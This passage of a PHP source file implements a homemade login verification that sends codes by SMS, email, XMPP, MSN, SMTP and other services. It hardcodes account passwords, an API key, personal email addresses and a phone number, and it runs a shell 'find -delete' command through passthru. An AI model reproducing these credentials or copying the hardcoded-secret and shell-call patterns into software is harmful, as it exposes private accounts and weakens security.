                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193验证您的访问权限失败', '本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
            		$voxeo = new voxeo_class();
                        $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Sorry! The verification code is：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                                   
            }
            elseif (strtolower(trim(request('verify'))) == 'email'){
                                   //mail('xcy6272003@126.com','X3193验证您的访问权限失败','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193验证您的访问权限失败', '本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                                  
            }
      			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193验证您的访问权限失败'),
              'html' => iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  			}             
            elseif (strtolower(trim(request('verify'))) == 'msn'){
            }   
            elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'yahoo'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'xmpp'){
               $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                   $conn->connect();
                   $conn->processUntil('session_start');
                   $conn->presence();
                   $conn->message('x3913@g.x3193.cz.cc', iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                   $conn->disconnect();
            } 
      			elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
      			}    
      			elseif (strtolower(trim(request('verify'))) == 'smtp'){
							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','本次登陆验证失败！'), iconv('gb2312','gb2312','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
     				}      			           
            elseif (strtolower(trim(request('verify'))) == 'gcal'){
                    	$google_calendar = new google_class();
                    	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]),trim('X3193登录验证'),trim('X3193登录验证模块'));
            }
            elseif (strtolower(trim(request('verify'))) == 'voxeo'){
               $voxeo = new imified_class();
                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
        		elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      			}           
                        }
                         
         					 ($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['PC']);
                   unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
                   unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);                   
              		 			//echo trim($_SERVER["SERVER_NAME"]).' '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' 1111 '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
              		 			//exit;
         				if (is_wap()){
                   				redirect(httppath());
                   			}else{
                   				redirect(httppath());                   			
                   			}                        
                }
}
exit;
} // idoll function end
?>

<?php 
//---------------------------------------------
// 被保护页面代码
//---------------------------------------------
//session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//session_start();
//if(substr(PHP_VERSION, 0, 3)=='5.4'){
//		//session_register("X3193");
//}
//elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
//		session_register("X3193");
//}
//if(($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] == $_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']!='')){
//}
//else{
//			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url'] = trim($_SERVER["SCRIPT_NAME"])."?".$_SERVER['QUERY_STRING'];
//			echo "<script>window.location = \""."./diy.php?api=verify&verify=xmpp"."\" ;</script>";
//			exit;
//}
//----------------------------------------

function verify(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');

$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 登录验证");
//$ipverify = 'n'; // y or n 单纯IP验证
//$smsverify = 'y'; // y or n 纯短信认证
//echo $smsverify;
//echo $ipowner.'gg';   
//$IPFilter = new IPFilter('');
//$ipallow = $IPFilter->IPlimiter();
//$redirecturl = $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
$verifymethod = '|fetion|voxeo|';
//$iplimiter = arrmember(checkip($ipallow,$redirecturl),'1');
//echo $iplimiter;

//echo $_SESSION["X3193"]['global'][$iplimiter]['verify']['success'].' '.$_COOKIE["X3193"]['global'][$iplimiter]['verify']['success'];
//exit;

if(preg_replace("/(.*)(|".strtolower(trim(request('verify')))."|)(.*)/", "$1$2$3", $verifymethod) != $verifymethod){
		session_destroy();	
		if(function_exists('passthru')){
						passthru("find /var/lib/openshift/5419a3585004461665000be4/php/sessions/* -type f -empty -delete",$result);		
		}else{
		}			
		
   	return;
}

if(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) == '' && strtoupper(trim(request('msgverifycode'))) == ''){

session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = '';
unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
//unset($_SESSION["X3193"]['global'][$iplimiter]['verify']);
//unset($_COOKIE["X3193"]['global'][$iplimiter]['verify']);
setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", "",time() + 3600*24*31, "/", ".".$_SERVER['SERVER_NAME'], 1);
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))] = randcode(32,'');
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = randcode(8,'number');

        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        	
        }
        else{
       	
      if (strtolower(trim(request('verify'))) == 'sim'){
                  //mail('xcy6272003@126.com','X3193正在验证您的访问权限','本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193正在验证您的访问权限', '本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！','gb2312');
				      		$voxeo = new voxeo_class();
                  $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','The code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);        
      }  
      elseif (strtolower(trim(request('verify'))) == 'email'){

                  //mail('xcy6272003@126.com','X3193正在验证您的访问权限','本次验证地址为：<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ！',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193正在验证您的访问权限', '本次验证地址为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'，IP地址为：'.$_SERVER['REMOTE_ADDR'],'gb2312');
     	}       
      elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
     	
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193正在验证您的访问权限'),
              'html' => iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  }   
      elseif (strtolower(trim(request('verify'))) == 'xmpp'){
         $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
             $conn->connect();
             $conn->processUntil('session_start');
             $conn->presence();
             $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
             $conn->disconnect();
      }   
      elseif (strtolower(trim(request('verify'))) == 'msn'){
					$sendMsg = new sendMsg();
					$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
					//echo $sendMsg->result.' '.$sendMsg->error;
      } 
      elseif (strtolower(trim(request('verify'))) == 'smtp'){
				$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        $smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','X3193正在验证您的访问权限'), iconv('gb2312','gb2312','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
      }        
      elseif (strtolower(trim(request('verify'))) == 'gcal'){
              	$google_calendar = new google_class();
              	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
        				$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('X3193正在验证您的访问权限,本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'IP地址为：'.$_SERVER['REMOTE_ADDR']),trim('X3193登录验证'),trim('X3193登录验证模块'));
      }
      elseif (strtolower(trim(request('verify'))) == 'voxeo'){
				      		$voxeo = new voxeo_class();
                  $voxeo->voxeosendsms('+8615998963077','The code of '.trim($_SERVER["SERVER_NAME"]).' is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);        
      }
      elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      }      
      redirect(httppath().'?api=verify&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=');
		}
}
elseif(trim(request('verify')) != '' && trim(request('verifycode')) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) == ''){
 
session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}
 
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
      		echo $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'];
        }
        else{
	//echo trim($_SERVER["SERVER_NAME"]);        	
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">

<table width="95%" height="89" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="">
        <tr>
                <td align="center" valign='middle'>
                        <form action="<?php  echo httppath().'?api=verify&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=';?>" method="post" name="verify">
                        &nbsp短信验证码：<input type="text" class="text" name="msgverify" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>

<?php         
        }
}
elseif(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) != '' && strlen(trim(request('msgverify'))) == '8'){

session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
//ini_set('session.gc_maxlifetime',60);  //设置垃圾回收最大生存时间
//ini_set('session.gc_probability',10);    //和session.gc_divisor一起构成清除垃圾的执行几率
//ini_set('session.gc_divisor',1);
session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
}

            if($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))] == trim(request('verifycode')) && $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] == trim(request('msgverify')) ){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        }
                        else{
     	 if (strtolower(trim(request('verify'))) == 'sim'){
                              //mail('xcy6272003@126.com','X3193已经成功验证了您的访问权限','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193已经成功验证了您的访问权限', '本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
            		$voxeo = new voxeo_class();
                $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                              
                      }        
            elseif (strtolower(trim(request('verify'))) == 'email'){
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193已经成功验证了您的访问权限', '本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                      }
      			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){

            				
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193.TK已经成功验证了您的访问权限'),
              'html' => iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  			}                               
            elseif (strtolower(trim(request('verify'))) == 'msn'){
            }   
            elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'yahoo'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'xmpp'){
               $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                   $conn->connect();
                   $conn->processUntil('session_start');
                   $conn->presence();
                   $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                   $conn->disconnect();
                 
            } 
      			elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证成功！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
      			}   
      			elseif (strtolower(trim(request('verify'))) == 'smtp'){
							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','本次登陆验证成功！'), iconv('gb2312','gb2312','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
     				}            
            elseif (strtolower(trim(request('verify'))) == 'gcal'){
                    	$google_calendar = new google_class();
                    	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('本次登陆验证成功！,本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].'IP地址为：'.$_SERVER['REMOTE_ADDR']),trim('X3193登录验证'),trim('X3193登录验证模块'));
            }
            elseif (strtolower(trim(request('verify'))) == 'voxeo'){
               //$voxeo = new voxeo_class();
               //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            		$voxeo = new voxeo_class();
                $voxeo->voxeosendsms('+8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
               
            }
       			elseif (strtolower(trim(request('verify'))) == 'fetion'){
       				
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
       				
							//$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// 手机号、飞信密码
							//$fetion->send('15998963077', iconv('gb2312','utf-8','本次登陆验证成功！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      			}            
         }
                   			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
                   			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
                                      
                   			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = randcode(32,'');
                   			unset($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);
                   			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", "", time() + 3600*24*31, "/", ".".$_SERVER['SERVER_NAME'], 1);
              		 			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'], time() + 3600*24*31);
               		 			
              		 			//echo trim($_SERVER["SERVER_NAME"]).' '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' 1111 '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
              		 			//exit;
         				if (is_wap()){
                   				redirect($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url']);
                   			}else{
                   				redirect($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url']);                   			
                   			}
                        break;
                }
                else{
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                        }
                        else{
            if (strtolower(trim(request('verify'))) == 'sms'){
                                   //mail('xcy6272003@126.com','X3193验证您的访问权限失败','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  //$html = new mail_class();
                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193验证您的访问权限失败', '本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
            		$voxeo = new voxeo_class();
                $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Sorry! The verification code is：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                                   
            }
            elseif (strtolower(trim(request('verify'))) == 'email'){
